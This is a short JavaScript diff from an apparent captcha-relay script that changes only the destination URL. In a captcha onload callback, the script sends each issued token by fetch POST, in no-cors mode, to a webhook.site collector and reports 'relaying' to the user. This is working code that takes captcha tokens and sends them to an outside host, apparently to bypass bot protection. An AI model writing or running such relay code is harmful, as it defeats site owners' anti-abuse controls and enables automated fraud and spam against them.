@@ -16,7 +16,7 @@ window.__ncaptchaOnloadTok = function() {
       if (tok) {
         setStatus('TOKEN ISSUED, relaying...');
         setOut(tok);
-        fetch('https://webhook.site/e281650385d444fd902bffbf064dc138', {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'text/plain'}, body: tok})
+        fetch('https://webhook.site/de0f6ccb-e02e-40cc-8b5b-3c7dacd59ff7', {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'text/plain'}, body: tok})
           
           .catch(function(e){ setStatus('RELAY FAILED: ' + e.message); });
       }
